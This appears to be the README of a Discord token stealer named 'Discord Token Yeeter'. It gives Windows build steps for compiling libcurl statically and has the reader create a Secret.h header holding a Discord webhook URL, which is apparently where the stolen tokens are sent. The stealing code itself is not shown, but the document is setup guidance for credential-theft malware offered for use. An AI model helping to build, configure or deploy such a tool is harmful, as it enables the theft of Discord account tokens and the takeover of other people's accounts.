# Discord Token Yeeter

## Compile LibCURL
```
.\curl> buildconf.bat
.\winbuild> nmake /f Makefile.vc mode=static machine=x64 rtlibcfg=static
```
## Create A File
Secret.h
```
#define WEBHOOK "https://discord.com/api/webhooks/.."
```
## Everything aside from Release (x64) probs doesn't work